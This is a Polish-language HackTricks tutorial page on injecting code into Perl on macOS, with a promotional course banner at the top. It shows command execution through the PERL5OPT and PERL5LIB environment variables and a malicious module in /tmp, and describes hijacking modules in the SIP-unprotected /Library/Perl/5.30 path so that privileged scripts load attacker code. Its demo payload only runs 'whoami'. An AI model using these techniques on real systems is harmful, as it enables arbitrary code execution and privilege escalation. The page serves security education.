# Wstrzykiwanie aplikacji Perl w macOS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Za pomocą zmiennej środowiskowej `PERL5OPT` i `PERL5LIB`

Korzystając z zmiennej środowiskowej PERL5OPT, można sprawić, że perl będzie wykonywał dowolne polecenia.\
Na przykład, utwórz ten skrypt:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Teraz **wyeksportuj zmienną środowiskową** i wykonaj skrypt **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Kolejną opcją jest utworzenie modułu Perl (np. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Następnie użyj zmiennych środowiskowych:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Poprzez zależności

Możliwe jest wymienienie folderów zależności uruchamiania Perla:
```bash
perl -e 'print join("\n", @INC)'
```
Który zwróci coś w stylu:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Niektóre z zwróconych folderów nawet nie istnieją, jednak **`/Library/Perl/5.30`** istnieje, nie jest chroniony przez SIP i znajduje się **przed** folderami chronionymi przez SIP. Dlatego ktoś mógłby nadużyć tego folderu, aby dodać zależności skryptu, tak aby skrypt Perl o wysokich uprawnieniach mógł je załadować.

{% hint style="warning" %}
Jednakże, zauważ, że **musisz być rootem, aby móc pisać w tym folderze**, a obecnie otrzymasz ten **komunikat TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (25).png" alt="" width="244"><figcaption></figcaption></figure>

Na przykład, jeśli skrypt importuje **`use File::Basename;`**, byłoby możliwe utworzenie `/Library/Perl/5.30/File/Basename.pm`, aby wykonać arbitralny kod.

## Referencje

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
